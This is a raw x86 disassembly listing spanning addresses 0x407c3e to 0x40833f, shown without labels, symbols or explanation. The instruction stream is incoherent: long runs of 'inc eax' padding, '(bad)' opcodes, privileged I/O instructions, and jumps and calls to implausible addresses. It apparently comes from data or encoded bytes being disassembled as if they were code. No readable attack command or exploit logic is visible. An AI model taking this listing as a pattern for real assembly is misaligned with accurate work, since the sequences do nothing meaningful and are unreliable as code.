  407c3e:	stos   DWORD PTR es:[edi],eax
  407c3f:	ret    
  407c40:	inc    eax
  407c41:	inc    eax
  407c42:	inc    eax
  407c43:	inc    eax
  407c44:	inc    eax
  407c45:	inc    eax
  407c46:	inc    eax
  407c47:	inc    eax
  407c48:	add    BYTE PTR [ebp-0x23],bh
  407c4b:	adc    eax,0x4246806a
  407c50:	mov    BYTE PTR [edx+0x52],ch
  407c53:	retf   
  407c54:	mov    ds:0x544722e,al
  407c59:	inc    edx
  407c5a:	je     0x407cb6
  407c5c:	push   es
  407c5d:	sub    BYTE PTR ds:0xac98c927,0x47
  407c64:	cmp    al,BYTE PTR [ebx]
  407c66:	repnz pop esp
  407c68:	xchg   edx,eax
  407c69:	inc    eax
  407c6a:	inc    eax
  407c6b:	inc    eax
  407c6c:	inc    eax
  407c6d:	inc    eax
  407c6e:	inc    eax
  407c6f:	and    eax,0x6b404040
  407c74:	mov    edi,0xd359a15a
  407c79:	dec    ebp
  407c7a:	dec    eax
  407c7b:	inc    ebx
  407c7c:	cmp    BYTE PTR [ecx+eax*2],ch
  407c7f:	add    edi,eax
  407c81:	sub    DWORD PTR [ecx-0x58],ecx
  407c84:	bound  ecx,QWORD PTR [eax+eax*2+0x40]
  407c88:	inc    eax
  407c89:	inc    eax
  407c8a:	inc    eax
  407c8b:	inc    eax
  407c8c:	inc    eax
  407c8d:	inc    eax
  407c8e:	inc    eax
  407c8f:	inc    eax
  407c90:	mov    dl,0x5a
  407c92:	aas    
  407c93:	dec    esp
  407c94:	xor    BYTE PTR [eax],dl
  407c96:	rol    BYTE PTR [eax+ebp*1-0xbbb64f8],0xbc
  407c9e:	nop
  407c9f:	ret    
  407ca0:	xchg   esi,eax
  407ca1:	sub    DWORD PTR [edi+0x29],eax
  407ca4:	rol    BYTE PTR ds:0xee319117,1
  407caa:	push   ecx
  407cab:	dec    eax
  407cac:	inc    ebx
  407cad:	retf   
  407cae:	call   0x471af3f4
  407cb3:	dec    ebp
  407cb4:	ds inc ebx
  407cb6:	inc    eax
  407cb7:	inc    eax
  407cb8:	inc    eax
  407cb9:	inc    eax
  407cba:	inc    eax
  407cbb:	inc    eax
  407cbc:	rol    DWORD PTR [eax+0x40],0x4d
  407cc0:	pop    edx
  407cc1:	imul   eax,DWORD PTR [ebp+0x44eec9b2],0x62
  407cc8:	int3   
  407cc9:	aas    
  407cca:	addr16 es push edi
  407ccd:	cmp    BYTE PTR [eax+0x70],bl
  407cd0:	ins    BYTE PTR es:[edi],dx
  407cd1:	pop    edx
  407cd2:	pop    DWORD PTR ds:0xc4706932
  407cd8:	aam    0xa6
  407cda:	ins    DWORD PTR es:[edi],dx
  407cdb:	repz inc edx
  407cdd:	inc    eax
  407cde:	inc    eax
  407cdf:	add    BYTE PTR [eax+0x40],al
  407ce2:	inc    eax
  407ce3:	inc    eax
  407ce4:	inc    eax
  407ce5:	inc    eax
  407ce6:	arpl   WORD PTR [ebp+ebx*2+0x62],bx
  407cea:	xchg   edx,eax
  407ceb:	add    DWORD PTR [ebx],0xffffffde
  407cee:	inc    ebp
  407cef:	cmp    BYTE PTR [eax-0xee1ff6d],ch
  407cf5:	inc    edi
  407cf6:	rol    BYTE PTR [edx+0x54],1
  407cf9:	xchg   esi,eax
  407cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cfb:	cmp    DWORD PTR [ebp-0x24],0xffffffd9
  407cff:	shl    BYTE PTR [esi],1
  407d01:	test   al,0x5b
  407d03:	inc    ecx
  407d04:	mov    bh,0x52
  407d06:	les    esi,FWORD PTR [esp+ebp*1+0x40]
  407d0a:	inc    eax
  407d0b:	inc    eax
  407d0c:	inc    eax
  407d0d:	inc    eax
  407d0e:	inc    eax
  407d0f:	inc    eax
  407d10:	inc    eax
  407d11:	inc    eax
  407d12:	inc    eax
  407d13:	adc    BYTE PTR [ebp+0x4f1b4503],ah
  407d19:	test   al,0x80
  407d1b:	mov    edi,0xabf132f1
  407d20:	mov    edi,0x40404011
  407d25:	inc    eax
  407d26:	inc    eax
  407d27:	inc    eax
  407d28:	int3   
  407d29:	jne    0x407d6b
  407d2b:	bound  edx,QWORD PTR [eax+0x53]
  407d2e:	pop    es
  407d2f:	pop    esi
  407d30:	push   ecx
  407d31:	inc    ecx
  407d32:	mov    esp,0x18e304eb
  407d37:	xchg   ebx,eax
  407d38:	inc    esp
  407d39:	pop    edx
  407d3a:	inc    ecx
  407d3b:	(bad)  
  407d3c:	int    0x1d
  407d3e:	add    BYTE PTR [edi+0x6260c02b],bl
  407d44:	push   ecx
  407d45:	xchg   BYTE PTR [eax+eax*2],ch
  407d48:	add    cl,al
  407d4a:	inc    eax
  407d4b:	inc    eax
  407d4c:	inc    eax
  407d4d:	inc    eax
  407d4e:	add    BYTE PTR [eax+0x7a],al
  407d51:	pop    eax
  407d52:	push   ebx
  407d53:	clc    
  407d54:	ror    bl,1
  407d56:	inc    ebp
  407d57:	mov    esi,0x61c955b1
  407d5c:	nop
  407d5d:	dec    eax
  407d5e:	dec    edx
  407d5f:	xor    al,0xfb
  407d61:	retf   
  407d62:	nop
  407d63:	nop
  407d64:	gs or  eax,0x4c530b5d
  407d6a:	inc    ebp
  407d6b:	push   ebx
  407d6c:	push   edi
  407d6d:	retf   
  407d6e:	lods   eax,DWORD PTR ds:[esi]
  407d6f:	pop    es
  407d70:	push   edx
  407d71:	or     eax,0x409430d2
  407d76:	inc    eax
  407d77:	inc    eax
  407d78:	inc    eax
  407d79:	inc    eax
  407d7a:	inc    eax
  407d7b:	inc    eax
  407d7c:	inc    eax
  407d7d:	inc    DWORD PTR [eax+0x42]
  407d80:	or     eax,DWORD PTR [ecx+0x9c042d1]
  407d86:	cmp    eax,0x4d4059cb
  407d8b:	inc    esp
  407d8c:	inc    ebp
  407d8d:	popa   
  407d8e:	stos   DWORD PTR es:[edi],eax
  407d8f:	dec    esp
  407d90:	fild   WORD PTR [eax]
  407d92:	push   ebx
  407d93:	call   0x15e26ec9
  407d98:	inc    eax
  407d99:	inc    eax
  407d9a:	inc    eax
  407d9b:	inc    eax
  407d9c:	inc    eax
  407d9d:	inc    eax
  407d9e:	inc    eax
  407d9f:	inc    eax
  407da0:	inc    eax
  407da1:	inc    eax
  407da2:	xchg   BYTE PTR [esi],ah
  407da4:	dec    ecx
  407da5:	inc    esp
  407da6:	mov    ss,WORD PTR [eax+0x76]
  407da9:	retf   
  407daa:	inc    DWORD PTR [edi-0x3]
  407dad:	inc    ebp
  407dae:	adc    DWORD PTR ds:0x10b4f52,eax
  407db4:	jb     0x407e31
  407db6:	xor    eax,0xeea9cb
  407dbb:	adc    edi,ebp
  407dbd:	test   eax,0x40404045
  407dc2:	inc    eax
  407dc3:	inc    eax
  407dc4:	inc    eax
  407dc5:	inc    eax
  407dc6:	inc    eax
  407dc7:	add    BYTE PTR [esi],al
  407dc9:	push   0x4c85d1d0
  407dce:	ja     0x407dc0
  407dd0:	inc    ecx
  407dd1:	adc    eax,0x40432b62
  407dd6:	inc    eax
  407dd7:	inc    eax
  407dd8:	inc    eax
  407dd9:	inc    eax
  407dda:	inc    eax
  407ddb:	and    eax,0x33404040
  407de0:	push   edx
  407de1:	inc    ebx
  407de2:	inc    edx
  407de3:	adc    BYTE PTR fs:[esi-0x7f],al
  407de7:	daa    
  407de8:	xor    al,BYTE PTR [eax+0x30]
  407deb:	(bad)  
  407dec:	push   eax
  407ded:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dee:	sbb    bl,BYTE PTR [ebx+0x42]
  407df1:	icebp  
  407df2:	addr16 inc eax
  407df4:	inc    eax
  407df5:	inc    eax
  407df6:	inc    eax
  407df7:	inc    eax
  407df8:	inc    eax
  407df9:	inc    eax
  407dfa:	inc    eax
  407dfb:	inc    eax
  407dfc:	inc    eax
  407dfd:	aas    
  407dfe:	add    eax,0xddbf818a
  407e03:	imul   ecx,DWORD PTR ds:0xafaa6bb5,0xa8424434
  407e0d:	arpl   WORD PTR [ebx-0x2fc4b41c],si
  407e13:	xchg   edi,eax
  407e14:	inc    eax
  407e15:	inc    eax
  407e16:	inc    eax
  407e17:	inc    eax
  407e18:	inc    eax
  407e19:	inc    eax
  407e1a:	rol    DWORD PTR [eax+0x40],0x12
  407e1e:	push   ebx
  407e1f:	(bad)  
  407e21:	cmp    BYTE PTR [eax+0x52],0xc4
  407e25:	dec    eax
  407e26:	scas   al,BYTE PTR es:[edi]
  407e27:	push   eax
  407e28:	inc    esi
  407e29:	pusha  
  407e2a:	lahf   
  407e2b:	ds dec edi
  407e2d:	adc    eax,0x2ef9503d
  407e32:	xor    al,0xab
  407e34:	mov    edi,0x40407dcb
  407e39:	add    BYTE PTR [eax+0x40],al
  407e3c:	inc    eax
  407e3d:	inc    eax
  407e3e:	inc    eax
  407e3f:	inc    eax
  407e40:	and    al,0x9f
  407e42:	adc    DWORD PTR [ebp+0x38439c48],0x40632f26
  407e4c:	inc    esp
  407e4d:	cmp    eax,0xd867d95b
  407e52:	add    DWORD PTR [edi+0x37],edx
  407e55:	ret    
  407e56:	and    al,0xa9
  407e58:	xor    BYTE PTR [edi+0x40],dh
  407e5b:	inc    eax
  407e5c:	inc    eax
  407e5d:	inc    eax
  407e5e:	inc    eax
  407e5f:	inc    eax
  407e60:	inc    eax
  407e61:	inc    eax
  407e62:	inc    eax
  407e63:	inc    eax
  407e64:	ret    0x5453
  407e67:	pushf  
  407e68:	inc    eax
  407e69:	mov    ah,0x40
  407e6b:	dec    eax
  407e6c:	add    DWORD PTR [edi+0x4d],edi
  407e6f:	add    eax,0x7cb4c82a
  407e74:	fs pop ebp
  407e76:	and    eax,DWORD PTR [eax+0x40]
  407e79:	inc    eax
  407e7a:	inc    eax
  407e7b:	inc    eax
  407e7c:	inc    eax
  407e7d:	int3   
  407e7e:	jne    0x407ec0
  407e80:	leave  
  407e81:	inc    eax
  407e82:	das    
  407e83:	add    eax,0x22db010f
  407e88:	dec    eax
  407e89:	dec    edi
  407e8a:	dec    edx
  407e8b:	xchg   BYTE PTR [edi],cl
  407e8d:	inc    ecx
  407e8e:	inc    esi
  407e8f:	bound  edi,QWORD PTR [esi+0x40]
  407e92:	xor    BYTE PTR ds:0x4d138193,bh
  407e98:	sar    BYTE PTR [edi-0x14],0xb3
  407e9c:	aaa    
  407e9d:	outs   dx,DWORD PTR ds:[esi]
  407e9e:	inc    eax
  407e9f:	add    cl,al
  407ea1:	inc    eax
  407ea2:	inc    eax
  407ea3:	inc    eax
  407ea4:	inc    eax
  407ea5:	add    BYTE PTR [eax-0x27],al
  407ea8:	xor    ebp,eax
  407eaa:	inc    ebx
  407eab:	mov    WORD PTR ds:0x407181fc,es
  407eb1:	jle    0x407ef5
  407eb3:	push   esp
  407eb4:	xchg   al,dh
  407eb6:	(bad)  
  407eb7:	mov    edi,0x8f382101
  407ebc:	xor    esi,ebp
  407ebe:	inc    eax
  407ebf:	inc    eax
  407ec0:	inc    eax
  407ec1:	inc    eax
  407ec2:	inc    eax
  407ec3:	inc    eax
  407ec4:	inc    eax
  407ec5:	inc    eax
  407ec6:	inc    DWORD PTR [eax+0x1a]
  407ec9:	cs mov bh,0x45
  407ecc:	push   0xffffffbd
  407ece:	mov    dl,0x70
  407ed0:	xchg   BYTE PTR [ecx],dh
  407ed2:	inc    eax
  407ed3:	mov    ebx,0x5c05422f
  407ed8:	adc    al,0x76
  407eda:	push   ebp
  407edb:	test   al,0xab
  407edd:	jo     0x407e65
  407edf:	(bad)  
  407ee0:	or     al,0x17
  407ee2:	jnp    0x407f2f
  407ee4:	inc    eax
  407ee5:	inc    eax
  407ee6:	inc    eax
  407ee7:	inc    eax
  407ee8:	inc    eax
  407ee9:	inc    eax
  407eea:	inc    eax
  407eeb:	inc    eax
  407eec:	inc    eax
  407eed:	inc    eax
  407eee:	mov    eax,0x833a6573
  407ef3:	test   DWORD PTR [ebp+0x3f],eax
  407ef6:	add    eax,0x458cb1c5
  407efb:	xor    DWORD PTR [ebp+0x5cccb40],esp
  407f01:	cmp    BYTE PTR [ecx],al
  407f03:	ins    BYTE PTR es:[edi],dx
  407f04:	ins    BYTE PTR es:[edi],dx
  407f05:	pop    edi
  407f06:	inc    ebp
  407f07:	inc    eax
  407f08:	inc    eax
  407f09:	inc    eax
  407f0a:	inc    eax
  407f0b:	inc    eax
  407f0c:	inc    eax
  407f0d:	inc    eax
  407f0e:	inc    eax
  407f0f:	add    BYTE PTR [esi-0x7a],al
  407f12:	inc    edx
  407f13:	dec    edi
  407f14:	adc    ah,BYTE PTR [edx+0x41]
  407f17:	xor    eax,0x743cc4
  407f1c:	xor    eax,0xcf40bf32
  407f21:	inc    eax
  407f22:	inc    eax
  407f23:	inc    eax
  407f24:	inc    eax
  407f25:	inc    eax
  407f26:	inc    eax
  407f27:	and    eax,0xb0404040
  407f2c:	mov    esi,DWORD PTR [esi]
  407f2e:	inc    ecx
  407f2f:	inc    ebx
  407f30:	sub    BYTE PTR [eax-0x58],dl
  407f33:	add    eax,0xc5b145a5
  407f38:	inc    ebp
  407f39:	cmp    eax,0x3d8610
  407f3e:	inc    eax
  407f3f:	jnp    0x407f81
  407f41:	inc    eax
  407f42:	inc    eax
  407f43:	inc    eax
  407f44:	inc    eax
  407f45:	inc    eax
  407f46:	inc    eax
  407f47:	inc    eax
  407f48:	inc    eax
  407f49:	inc    eax
  407f4a:	inc    ebx
  407f4b:	ret    
  407f4c:	cwde   
  407f4d:	daa    
  407f4e:	jle    0x407f82
  407f50:	lock mov esp,0x43414670
  407f56:	jbe    0x407f52
  407f58:	pusha  
  407f59:	or     eax,0x406a49b8
  407f5e:	les    ebp,FWORD PTR [edx-0x4a]
  407f61:	inc    eax
  407f62:	inc    eax
  407f63:	inc    eax
  407f64:	inc    eax
  407f65:	inc    eax
  407f66:	inc    eax
  407f67:	rol    DWORD PTR [eax+0x40],0x45
  407f6b:	bound  ebx,QWORD PTR [eax+0x58]
  407f6e:	aaa    
  407f6f:	out    dx,eax
  407f70:	test   BYTE PTR [ebx],bl
  407f72:	xor    ebp,DWORD PTR [edx]
  407f74:	shl    BYTE PTR [eax+ebp*1-0x3],0x25
  407f79:	(bad)  
  407f7b:	hlt    
  407f7c:	dec    esp
  407f7d:	push   ecx
  407f7e:	dec    edx
  407f7f:	stos   DWORD PTR es:[edi],eax
  407f80:	dec    edx
  407f81:	outs   dx,DWORD PTR ds:[esi]
  407f82:	test   eax,0x20c94331
  407f87:	mov    bl,0x1
  407f89:	push   ecx
  407f8a:	inc    edx
  407f8b:	fs inc eax
  407f8d:	inc    eax
  407f8e:	add    BYTE PTR [eax+0x40],al
  407f91:	inc    eax
  407f92:	inc    eax
  407f93:	inc    eax
  407f94:	inc    eax
  407f95:	std    
  407f96:	lods   al,BYTE PTR ds:[esi]
  407f97:	add    al,ch
  407f99:	xor    ch,al
  407f9b:	leave  
  407f9c:	inc    ebx
  407f9d:	jo     0x407fb4
  407f9f:	jmp    0x8c47:0x401303cd
  407fa6:	inc    ecx
  407fa7:	test   al,0x3d
  407fa9:	ret    
  407faa:	sbb    eax,DWORD PTR [ecx]
  407fac:	test   eax,0x4312f083
  407fb1:	add    dl,BYTE PTR [ebx-0x7fe26b49]
  407fb7:	dec    eax
  407fb8:	ja     0x407fdc
  407fba:	dec    ebx
  407fbb:	inc    eax
  407fbc:	inc    eax
  407fbd:	inc    eax
  407fbe:	inc    eax
  407fbf:	inc    eax
  407fc0:	inc    eax
  407fc1:	inc    eax
  407fc2:	inc    eax
  407fc3:	inc    eax
  407fc4:	inc    eax
  407fc5:	push   eax
  407fc6:	inc    ecx
  407fc7:	push   esp
  407fc8:	bound  eax,QWORD PTR [edx-0x1f]
  407fcb:	inc    eax
  407fcc:	adc    ecx,esp
  407fce:	dec    edi
  407fcf:	inc    ecx
  407fd0:	dec    eax
  407fd1:	test   BYTE PTR [ebp+esi*1+0x59],ah
  407fd5:	dec    esp
  407fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fd7:	inc    esp
  407fd8:	xor    al,0x3c
  407fda:	mov    ch,0x40
  407fdc:	inc    eax
  407fdd:	inc    eax
  407fde:	inc    eax
  407fdf:	inc    eax
  407fe0:	inc    eax
  407fe1:	int3   
  407fe2:	jne    0x408024
  407fe4:	clc    
  407fe5:	jno    0x407ffc
  407fe7:	push   0x2c
  407fe9:	inc    eax
  407fea:	inc    edx
  407feb:	pop    ecx
  407fec:	dec    esp
  407fed:	inc    esi
  407fee:	retf   
  407fef:	mov    ds:0x10c50bf,eax
  407ff4:	xor    BYTE PTR [ecx+0x4f],0xfc
  407ff8:	push   esi
  407ff9:	inc    ecx
  407ffa:	int    0xe7
  407ffc:	ins    DWORD PTR es:[edi],dx
  407ffd:	popa   
  407ffe:	xor    esp,DWORD PTR [edi+0x4a]
  408001:	inc    eax
  408002:	add    cl,al
  408004:	inc    eax
  408005:	inc    eax
  408006:	inc    eax
  408007:	inc    eax
  408008:	add    BYTE PTR [eax-0x8],al
  40800b:	mov    eax,0x4075443a
  408010:	popa   
  408011:	out    dx,al
  408012:	mov    al,0x5
  408014:	fiadd  WORD PTR [eax]
  408016:	mov    edi,0x624cd801
  40801b:	retf   
  40801c:	mov    al,0x78
  40801e:	xor    al,0xb6
  408020:	loope  0x408037
  408022:	inc    eax
  408023:	inc    eax
  408024:	inc    eax
  408025:	inc    eax
  408026:	inc    eax
  408027:	inc    eax
  408028:	inc    eax
  408029:	inc    eax
  40802a:	inc    DWORD PTR [eax-0x5c]
  40802d:	push   ecx
  40802e:	mov    al,0x40
  408030:	mov    ch,0xbc
  408032:	fmul   st(3),st
  408034:	add    eax,0x70745744
  408039:	dec    ebp
  40803a:	gs inc eax
  40803c:	retf   
  40803d:	push   0xffffffab
  40803f:	inc    eax
  408040:	adc    al,BYTE PTR [ecx+0x0]
  408043:	sub    bh,BYTE PTR [eax+eiz*2-0x56]
  408047:	jo     0x40807b
  408049:	inc    eax
  40804a:	popa   
  40804b:	inc    edx
  40804c:	pop    edi
  40804d:	bound  ecx,QWORD PTR [ebp+0x404034e0]
  408053:	inc    eax
  408054:	inc    eax
  408055:	inc    eax
  408056:	inc    eax
  408057:	inc    eax
  408058:	inc    eax
  408059:	inc    eax
  40805a:	inc    eax
  40805b:	push   eax
  40805c:	fisttp QWORD PTR [edx+0x62]
  40805f:	mov    eax,0x783140fe
  408064:	(bad)  
  408065:	and    al,0x32
  408067:	add    eax,0x5a69727d
  40806c:	rcl    BYTE PTR [eax],1
  40806e:	or     al,0xc9
  408070:	mov    ah,0x40
  408072:	icebp  
  408073:	es ins DWORD PTR es:[edi],dx
  408075:	push   esp
  408076:	arpl   WORD PTR [edx-0x2],cx
  408079:	ins    DWORD PTR es:[edi],dx
  40807a:	inc    eax
  40807b:	inc    eax
  40807c:	inc    eax
  40807d:	inc    eax
  40807e:	inc    eax
  40807f:	inc    eax
  408080:	inc    eax
  408081:	inc    eax
  408082:	add    BYTE PTR [ebp-0x54],bl
  408085:	fadd   DWORD PTR ds:0x4056eb75
  40808b:	repz push edx
  40808d:	pop    esp
  40808e:	retf   
  40808f:	xor    eax,0x5a01c076
  408094:	lds    esp,FWORD PTR [esp+ebp*4+0x26]
  408098:	test   al,0xe5
  40809a:	inc    eax
  40809b:	push   ecx
  40809c:	dec    edi
  40809d:	jle    0x40806a
  40809f:	adc    BYTE PTR es:[eax+0x40],al
  4080a3:	inc    eax
  4080a4:	inc    eax
  4080a5:	inc    eax
  4080a6:	inc    eax
  4080a7:	and    eax,0x1d404040
  4080ac:	adc    ebx,DWORD PTR [edx+0x42]
  4080af:	js     0x4080c6
  4080b1:	pop    eax
  4080b2:	push   eax
  4080b3:	pop    edx
  4080b4:	inc    eax
  4080b5:	hlt    
  4080b6:	arpl   WORD PTR cs:[esi+eiz*1+0x5],ax
  4080bb:	repz inc eax
  4080bd:	lahf   
  4080be:	aad    0x47
  4080c0:	pop    ebx
  4080c1:	and    eax,0x32129b42
  4080c6:	inc    esp
  4080c7:	test   al,0x24
  4080c9:	aam    0x1
  4080cb:	adc    eax,0x407b6042
  4080d0:	inc    eax
  4080d1:	inc    eax
  4080d2:	inc    eax
  4080d3:	inc    eax
  4080d4:	inc    eax
  4080d5:	inc    eax
  4080d6:	inc    eax
  4080d7:	inc    eax
  4080d8:	inc    eax
  4080d9:	adc    DWORD PTR [eax+0x2402c81],edi
  4080df:	shl    DWORD PTR [eax+ecx*2-0x2229d9fb],1
  4080e6:	test   eax,0xcb410558
  4080eb:	es test eax,0xcb55489b
  4080f1:	mov    BYTE PTR [eax+ecx*2-0x44],0xdd
  4080f6:	adc    BYTE PTR [edi],0xbc
  4080f9:	in     al,0x41
  4080fb:	add    eax,0x4023cc71
  408100:	inc    eax
  408101:	inc    eax
  408102:	inc    eax
  408103:	inc    eax
  408104:	inc    eax
  408105:	rol    DWORD PTR [eax+0x40],0x13
  408109:	adc    eax,0xbbcb4544
  40810e:	push   cs
  40810f:	jg     0x408167
  408111:	inc    ebp
  408112:	hlt    
  408113:	cmp    al,0x26
  408115:	ins    BYTE PTR es:[edi],dx
  408116:	out    0x1,eax
  408118:	xor    DWORD PTR ds:0xdfc7b807,ebp
  40811e:	cs dec ecx
  408120:	push   ebp
  408121:	fsubr  QWORD PTR [eax+0x3094cdfa]
  408127:	add    DWORD PTR [ebp+0xfa81262],edx
  40812d:	push   eax
  40812e:	inc    eax
  40812f:	inc    eax
  408130:	add    BYTE PTR [eax+0x40],al
  408133:	inc    eax
  408134:	inc    eax
  408135:	inc    eax
  408136:	inc    eax
  408137:	inc    ebx
  408138:	imul   ebx,DWORD PTR [eax-0x66],0x51
  40813c:	adc    DWORD PTR [ecx],esi
  40813e:	pop    ebp
  40813f:	mov    ebx,0xcbc49335
  408144:	mov    esp,0x5e7dd10
  408149:	dec    di
  40814b:	dec    esp
  40814c:	or     eax,0x68455eb8
  408151:	xchg   ebx,eax
  408152:	inc    eax
  408153:	or     eax,0x40404040
  408158:	inc    eax
  408159:	inc    eax
  40815a:	inc    eax
  40815b:	inc    eax
  40815c:	inc    eax
  40815d:	inc    eax
  40815e:	retf   
  40815f:	add    eax,0x3f8152cc
  408164:	inc    eax
  408165:	retf   
  408166:	inc    esp
  408167:	dec    ebp
  408168:	mov    eax,0x1c94cca
  40816d:	popa   
  40816e:	inc    ecx
  40816f:	jmp    0x408176
  408171:	push   esi
  408172:	xor    DWORD PTR [esp+esi*4+0x46],0x2ecb1b7c
  40817a:	inc    ebx
  40817b:	and    ebp,eax
  40817d:	shl    DWORD PTR [edi+0x40],0x40
  408181:	inc    eax
  408182:	inc    eax
  408183:	inc    eax
  408184:	inc    eax
  408185:	int3   
  408186:	jne    0x4081c8
  408188:	fsub   QWORD PTR [ecx+0x20]
  40818b:	or     BYTE PTR [eax+0x45],0x1c
  40818f:	sbb    BYTE PTR [ebx+edx*8-0x80],0x35
  408194:	xchg   ecx,eax
  408195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408196:	bound  eax,QWORD PTR [eax+0x0]
  408199:	rol    DWORD PTR [eax+0x40],0x40
  40819d:	inc    eax
  40819e:	add    BYTE PTR [eax-0x3b],al
  4081a1:	mov    ah,0x1
  4081a3:	xchg   ebx,eax
  4081a4:	dec    edi
  4081a5:	inc    edx
  4081a6:	jl     0x4081fd
  4081a8:	nop
  4081a9:	add    eax,0xd081410b
  4081ae:	outs   dx,DWORD PTR ds:[esi]
  4081af:	sub    al,0x4a
  4081b1:	xchg   DWORD PTR [eax+0x13],ebp
  4081b4:	adc    eax,DWORD PTR ds:0x28d31040
  4081ba:	and    ah,BYTE PTR [edx+eax*8]
  4081bd:	inc    eax
  4081be:	sub    ebp,DWORD PTR [ecx-0x40]
  4081c1:	inc    edx
  4081c2:	inc    eax
  4081c3:	inc    eax
  4081c4:	inc    eax
  4081c5:	inc    eax
  4081c6:	inc    eax
  4081c7:	inc    eax
  4081c8:	inc    eax
  4081c9:	inc    eax
  4081ca:	inc    DWORD PTR [eax+0x65]
  4081cd:	imul   DWORD PTR [ecx]
  4081cf:	push   ebx
  4081d0:	cmc    
  4081d1:	test   al,0xcb
  4081d3:	dec    ebp
  4081d4:	in     al,dx
  4081d5:	sub    al,0xb6
  4081d7:	outs   dx,DWORD PTR ds:[esi]
  4081d8:	bound  edx,QWORD PTR [eax]
  4081da:	mov    edi,0x666680fc
  4081df:	pop    ds
  4081e0:	pop    ds
  4081e1:	inc    edx
  4081e2:	mov    edi,0xc13e62fd
  4081e7:	outs   dx,DWORD PTR ds:[esi]
  4081e8:	and    BYTE PTR [eax+0x40],al
  4081eb:	inc    eax
  4081ec:	inc    eax
  4081ed:	inc    eax
  4081ee:	inc    eax
  4081ef:	inc    eax
  4081f0:	inc    eax
  4081f1:	inc    eax
  4081f2:	inc    eax
  4081f3:	inc    edx
  4081f4:	or     eax,0x3aca733c
  4081f9:	pop    ds
  4081fa:	arpl   WORD PTR [edx-0x5a],sp
  4081fd:	mov    BYTE PTR [eax],ch
  4081ff:	inc    ebx
  408200:	(bad)  
  408201:	idiv   DWORD PTR [ebp+0x6384a828]
  408207:	push   ebp
  408208:	outs   dx,DWORD PTR es:[esi]
  40820a:	les    esi,FWORD PTR [ebx+0x12]
  40820d:	push   0x1f409a68
  408212:	dec    edi
  408213:	inc    eax
  408214:	inc    eax
  408215:	inc    eax
  408216:	inc    eax
  408217:	inc    eax
  408218:	inc    eax
  408219:	inc    eax
  40821a:	inc    eax
  40821b:	add    BYTE PTR [eax-0x44],ah
  40821e:	dec    ebp
  40821f:	and    BYTE PTR [esi-0x223990d2],ch
  408225:	adc    eax,0x4d4866dd
  40822a:	pop    ds
  40822b:	jmp    0x408290
  40822d:	retf   
  40822e:	push   edi
  40822f:	jmp    0x4825:0x6248c0c5
  408236:	inc    eax
  408237:	inc    eax
  408238:	inc    eax
  408239:	inc    eax
  40823a:	inc    eax
  40823b:	inc    eax
  40823c:	and    eax,0x84404040
  408241:	enter  0x234f,0x3f
  408245:	imul   eax
  408247:	dec    ebp
  408248:	jae    0x408213
  40824a:	or     BYTE PTR [ebp+0x48],0xab
  40824e:	sub    eax,0x2e36e72c
  408253:	ret    
  408254:	mov    edi,0x706cc642
  408259:	leave  
  40825a:	test   eax,0x29ab6f85
  40825f:	xor    al,0x63
  408261:	outs   dx,BYTE PTR ds:[esi]
  408262:	and    esp,DWORD PTR ds:0x8068b41f
  408268:	inc    eax
  408269:	inc    eax
  40826a:	inc    eax
  40826b:	inc    eax
  40826c:	inc    eax
  40826d:	inc    eax
  40826e:	inc    eax
  40826f:	inc    eax
  408270:	inc    eax
  408271:	inc    eax
  408272:	adc    eax,0x27c2d264
  408277:	add    eax,0x64cbc588
  40827c:	add    BYTE PTR [edx],dh
  40827e:	pop    ecx
  40827f:	leave  
  408280:	push   0x4055454
  408285:	jmp    0x4082d9
  408287:	inc    esp
  408288:	sahf   
  408289:	inc    edx
  40828a:	or     eax,0x73c1d2cb
  40828f:	inc    ebp
  408290:	inc    eax
  408291:	inc    eax
  408292:	inc    eax
  408293:	inc    eax
  408294:	inc    eax
  408295:	inc    eax
  408296:	rol    DWORD PTR [eax+0x40],0x7c
  40829a:	push   ebp
  40829b:	inc    ecx
  40829c:	pusha  
  40829d:	fisubr DWORD PTR [edi]
  40829f:	push   esp
  4082a0:	push   esp
  4082a1:	bound  esi,QWORD PTR [esi+edx*2]
  4082a4:	xor    al,0x20
  4082a6:	leave  
  4082a7:	aad    0x38
  4082a9:	inc    eax
  4082aa:	mov    bh,0x94
  4082ac:	mov    edi,0x52bf494e
  4082b1:	adc    BYTE PTR [edx-0x3c5947ab],ch
  4082b7:	jmp    0x35e8ee8c
  4082bc:	ret    
  4082bd:	fild   WORD PTR [eax+0x40]
  4082c0:	add    BYTE PTR [eax+0x40],al
  4082c3:	inc    eax
  4082c4:	inc    eax
  4082c5:	inc    eax
  4082c6:	inc    eax
  4082c7:	push   edi
  4082c8:	xor    al,0xb3
  4082ca:	in     eax,dx
  4082cb:	adc    BYTE PTR [edi],ah
  4082cd:	push   esp
  4082ce:	adc    al,0xc3
  4082d0:	aaa    
  4082d1:	push   0xffffffa8
  4082d3:	dec    eax
  4082d4:	xchg   BYTE PTR [eax+eax*4+0x1055421a],al
  4082db:	add    eax,0xc51ec362
  4082e0:	push   eax
  4082e1:	or     eax,0x404040bc
  4082e6:	inc    eax
  4082e7:	inc    eax
  4082e8:	inc    eax
  4082e9:	inc    eax
  4082ea:	inc    eax
  4082eb:	inc    eax
  4082ec:	inc    eax
  4082ed:	retf   
  4082ee:	push   esp
  4082ef:	xchg   edx,eax
  4082f0:	stos   BYTE PTR es:[edi],al
  4082f1:	cmp    DWORD PTR [eax],ecx
  4082f3:	cmp    al,0x41
  4082f5:	adc    al,BYTE PTR [eax]
  4082f7:	mov    edi,0x3d6fc726
  4082fc:	inc    eax
  4082fd:	inc    eax
  4082fe:	inc    eax
  4082ff:	inc    eax
  408300:	inc    eax
  408301:	inc    eax
  408302:	int3   
  408303:	jne    0x408345
  408305:	push   0xf8494a54
  40830a:	call   DWORD PTR ds:0x3615ac62
  408310:	enter  0x6d13,0x6f
  408314:	pop    eax
  408315:	(bad)  
  408316:	retf   
  408317:	outs   dx,BYTE PTR ds:[esi]
  408318:	xchg   esp,eax
  408319:	rol    bh,0x1f
  40831c:	xor    al,0xfd
  40831e:	adc    DWORD PTR [eax+0x40c10040],ebp
  408324:	inc    eax
  408325:	inc    eax
  408326:	inc    eax
  408327:	add    BYTE PTR [eax+0x62],al
  40832a:	mov    eax,ds:0x3cb86f02
  40832f:	push   eax
  408330:	mov    edi,0x1fc16dd0
  408335:	add    eax,0xcb3e0d67
  40833a:	adc    eax,0x4279664e
  40833f:	retf   
